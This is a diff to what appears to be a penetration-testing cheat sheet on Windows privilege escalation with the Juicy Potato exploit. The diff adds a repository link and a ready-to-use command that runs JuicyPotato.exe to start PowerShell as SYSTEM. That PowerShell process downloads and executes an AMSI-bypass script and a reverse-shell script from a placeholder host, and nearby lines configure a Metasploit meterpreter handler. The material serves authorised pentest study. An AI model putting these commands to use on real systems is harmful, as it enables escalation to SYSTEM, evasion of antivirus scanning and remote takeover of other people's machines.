@@ -578,6 +578,7 @@ Service accounts are generally configured with these two privileges. They allow 
 
 ### Juicy potato
 - https://github.com/ohpe/juicy-potato
+- https://github.com/TsukiCTF/Lovely-Potato
 Rotten Potato was quite a limited exploit. Juicy Potato works in the same way as Rotten Potato, but the authors did extensive research and found many more ways to exploit.
 
 #### Run the JuicyPotato exploit to trigger a reverse shell running with SYSTEM privileges:
@@ -600,6 +601,8 @@ use multi/handler
 set payload windows/x64/meterpreter/bind_tcp
 set LPORT 6666
 set RHOST <IP>
+ 
+.\JuicyPotato.exe -l 1337 -p "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "iex (New-Object Net.WebClient).DownloadString('http://x.x.x.x:8090/amsi.txt'); iex (New-Object Net.WebClient).DownloadString('http://x.x.x.x:8090/Invoke-PowerShellTcp2.ps1')" -t *
 ```
 
 ### Rogue potato
